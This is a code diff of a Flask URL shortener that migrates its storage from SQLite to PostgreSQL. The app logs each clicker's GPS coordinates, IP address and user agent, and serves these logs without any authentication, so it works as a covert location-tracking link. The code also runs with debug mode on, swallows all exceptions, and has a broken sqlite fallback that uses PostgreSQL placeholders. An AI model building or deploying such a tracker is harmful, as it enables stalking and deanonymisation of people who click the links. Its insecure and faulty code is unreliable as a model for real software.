@@ -1,49 +1,56 @@
 from flask import Flask, request, jsonify, render_template, redirect
-import sqlite3
+import os
 import uuid
 import logging
-import os
+from datetime import datetime
 
 app = Flask(__name__)
 app.config['DEBUG'] = True
 
 logging.basicConfig(level=logging.INFO)
 
-DB_NAME = 'database.db'
+# PostgreSQL connection
+DATABASE_URL = os.environ.get('DATABASE_URL')
 
-def init_db(force_reset=False):
-    if force_reset and os.path.exists(DB_NAME):
-        try:
-            os.remove(DB_NAME)
-            logging.info("Old database deleted and recreated")
-        except:
-            pass
-    
-    conn = sqlite3.connect(DB_NAME)
+if not DATABASE_URL:
+    logging.error("DATABASE_URL not found!")
+    DATABASE_URL = "sqlite:///database.db"  # fallback
+
+import psycopg2
+from psycopg2.extras import RealDictCursor
+
+def get_db_connection():
+    if DATABASE_URL.startswith('postgres'):
+        conn = psycopg2.connect(DATABASE_URL)
+    else:
+        # Fallback for local testing
+        import sqlite3
+        conn = sqlite3.connect('database.db')
+        conn.row_factory = sqlite3.Row
+        return conn
+    return conn
+
+def init_db():
+    conn = get_db_connection()
     c = conn.cursor()
-    
-    # Drop existing tables if force reset
-    if force_reset:
-        c.execute('DROP TABLE IF EXISTS links')
-        c.execute('DROP TABLE IF EXISTS logs')
     
     c.execute('''
         CREATE TABLE IF NOT EXISTS links (
             id TEXT PRIMARY KEY,
             original_url TEXT NOT NULL,
             short_code TEXT UNIQUE NOT NULL,
-            created_at TEXT DEFAULT CURRENT_TIMESTAMP
+            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
         )
     ''')
     
     c.execute('''
         CREATE TABLE IF NOT EXISTS logs (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            id SERIAL PRIMARY KEY,
             short_code TEXT,
             latitude REAL,
             longitude REAL,
             accuracy REAL,
-            timestamp TEXT DEFAULT CURRENT_TIMESTAMP,
+            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
             ip TEXT,
             user_agent TEXT
         )
@@ -51,8 +58,7 @@ def init_db(force_reset=False):
     conn.commit()
     conn.close()
 
-# Initialize database (with reset option)
-init_db(force_reset=False)   # Change to True if you want to force reset on every start
+init_db()
 
 # ====================== ROUTES ======================
 
@@ -60,33 +66,29 @@ init_db(force_reset=False)   # Change to True if you want to force reset on ever
 def home():
     return render_template('index.html')
 
-# Create short link
 @app.route('/api/shorten', methods=['POST'])
 def shorten():
     data = request.get_json()
     original_url = data.get('original_url')
-    
     if not original_url:
         return jsonify({'error': 'URL is required'}), 400
 
-    conn = sqlite3.connect(DB_NAME)
+    conn = get_db_connection()
     c = conn.cursor()
     
     for _ in range(5):
         short_code = str(uuid.uuid4())[:8].lower()
         try:
-            c.execute('INSERT INTO links (id, original_url, short_code) VALUES (?, ?, ?)',
+            c.execute('INSERT INTO links (id, original_url, short_code) VALUES (%s, %s, %s)',
                       (str(uuid.uuid4()), original_url, short_code))
             conn.commit()
-            
             short_url = f"{request.host_url.rstrip('/')}/{short_code}"
             conn.close()
             return jsonify({'short_url': short_url, 'short_code': short_code})
-        except sqlite3.IntegrityError:
+        except Exception:
             continue
-    
     conn.close()
-    return jsonify({'error': 'Failed to create unique short code'}), 500
+    return jsonify({'error': 'Failed to create short code'}), 500
 
 @app.route('/<short_code>')
 def track(short_code):
@@ -96,26 +98,20 @@ def track(short_code):
 def log_location(short_code):
     short_code = short_code.strip().lower()
     data = request.get_json() or {}
-    
-    latitude = data.get('latitude')
-    longitude = data.get('longitude')
-    accuracy = data.get('accuracy')
-    
-    ip = request.remote_addr
-    user_agent = request.headers.get('User-Agent')
-    
-    conn = sqlite3.connect(DB_NAME)
+
+    conn = get_db_connection()
     c = conn.cursor()
     
-    c.execute('SELECT original_url FROM links WHERE short_code = ?', (short_code,))
+    c.execute('SELECT original_url FROM links WHERE short_code = %s', (short_code,))
     if not c.fetchone():
         conn.close()
         return jsonify({'error': 'Link not found'}), 404
-    
+
     c.execute('''
         INSERT INTO logs (short_code, latitude, longitude, accuracy, ip, user_agent)
-        VALUES (?, ?, ?, ?, ?, ?)
-    ''', (short_code, latitude, longitude, accuracy, ip, user_agent))
+        VALUES (%s, %s, %s, %s, %s, %s)
+    ''', (short_code, data.get('latitude'), data.get('longitude'),
+          data.get('accuracy'), request.remote_addr, request.headers.get('User-Agent')))
     
     conn.commit()
     conn.close()
@@ -124,17 +120,16 @@ def log_location(short_code):
 @app.route('/redirect/<short_code>')
 def final_redirect(short_code):
     short_code = short_code.strip().lower()
-    conn = sqlite3.connect(DB_NAME)
+    conn = get_db_connection()
     c = conn.cursor()
-    c.execute('SELECT original_url FROM links WHERE short_code = ?', (short_code,))
+    c.execute('SELECT original_url FROM links WHERE short_code = %s', (short_code,))
     result = c.fetchone()
     conn.close()
     
     if result:
-        return redirect(result[0])
-    return f"Link not found", 404
+        return redirect(result[0] if isinstance(result, dict) else result[0])
+    return "Link not found", 404
 
-# Logs pages
 @app.route('/logs/<short_code>')
 def logs_page(short_code):
     return render_template('logs.html', short_code=short_code.lower())
@@ -142,22 +137,21 @@ def logs_page(short_code):
 @app.route('/api/logs/<short_code>')
 def get_logs(short_code):
     short_code = short_code.strip().lower()
-    conn = sqlite3.connect(DB_NAME)
+    conn = get_db_connection()
     c = conn.cursor()
-    c.execute('SELECT latitude, longitude, accuracy, timestamp, ip, user_agent FROM logs WHERE short_code = ? ORDER BY timestamp DESC', (short_code,))
+    c.execute('''
+        SELECT latitude, longitude, accuracy, timestamp, ip, user_agent 
+        FROM logs 
+        WHERE short_code = %s 
+        ORDER BY timestamp DESC
+    ''', (short_code,))
     logs = c.fetchall()
     conn.close()
     
-    return jsonify([{
+    return jsonify([dict(row) if hasattr(row, 'keys') else {
         'lat': row[0], 'lng': row[1], 'accuracy': row[2],
         'time': row[3], 'ip': row[4], 'user_agent': row[5]
     } for row in logs])
-
-# ====================== ADMIN RESET ======================
-@app.route('/admin/reset-db')
-def reset_database():
-    init_db(force_reset=True)
-    return "Database has been reset successfully! <a href='/'>Go Home</a>"
 
 if __name__ == '__main__':
     app.run(debug=True, port=5000)
